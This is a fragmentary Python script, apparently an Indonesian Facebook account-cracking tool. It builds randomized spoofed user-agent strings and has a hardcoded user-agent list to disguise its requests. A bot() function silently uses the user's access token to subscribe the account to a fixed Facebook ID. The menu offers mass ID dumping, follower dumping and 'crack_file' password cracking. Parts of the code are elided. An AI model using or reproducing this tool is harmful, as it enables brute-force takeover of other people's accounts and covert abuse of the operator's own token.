...
for xd in range(10000):
	...
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78'
	...
	g=') AppleWebKit/537.36 (KHTML, like Gecko) OculusBrowser/8.1.5.203450095 SamsungBrowser/4.0 Chrome/79.0.3945.126'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile VR Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI P7-L10; Flow)'
	...
	i='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/366.0.0.303'
...
#------------------[ LOGO-LAKNAT ]-----------------#
def gweh():
  "Mozilla/5.0 (Linux; Android 8.1.0; TA-1021 Build/OPR1.170623.026) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/69.0.3477.0 Mobile Safari/537.36","Mozilla/5.0 (Symbian/3; Series60/5.3 NokiaE7-00/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/8.3.1.4 Mobile Safari/535.1","Mozilla/5.0 (SymbianOS/9.2;U; Series60/5.0 SonyEricssonU8i/1.00;Profile/MIDP-2.1 Configuration/ CLDC-1.1)AppleWebKit/525 (KHTML, like Gecko) version/3.0Safari/525","Mozilla/5.0 (Linux; Android 5.1; Archos 55 Platinum Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0","Mozilla/5.0 (Series40; NokiaX3-02/07.51; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31","Mozilla/5.0 (Android 5.1; U613 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) NTENTBrowser/1.0.0.547 (CellularOne-US) Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; 21051182G Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Safari/537.36 ACHEETAHI/1","Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S7250/S7250XXKHD; U; Bada/2.0; tr-tr) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/3.0 Mobile HVGA SMM-MMS/1.2.0 OPN-B","Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0 YouBrowser/1.0.9","Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_0; nl-nl) AppleWebKit/601.4.4 (KHTML, like Gecko) Fluid/1.7.1 Safari/532.3+","Mozilla/5.0 (Linux; Android 9; ANE-LX1; HMSCore 6.6.0.351; GMSCore 22.26.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/105.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; SM-N910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)"
...
def bot():
	try:
		requests.post("https://graph.facebook.com/100000616638984?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	print('├──> 0. Keluar       ')
	print('|')
	_____Anastan__xd_____ = input('\r├──> Pilih : ')
	if _____Anastan__xd_____ in ['1']:
		dump_massal()
	elif _____Anastan__xd_____ in ['2']:
		dump_follower()
	elif _____Anastan__xd_____ in ['3']:
		error()
	elif _____Anastan__xd_____ in ['4']:
		crack_file()
	elif _____Anastan__xd_____ in ['5']:
		result()
	elif _____Anastan__xd_____ in ['6']:
		memek()
	elif _____Anastan__xd_____ in ['0']:
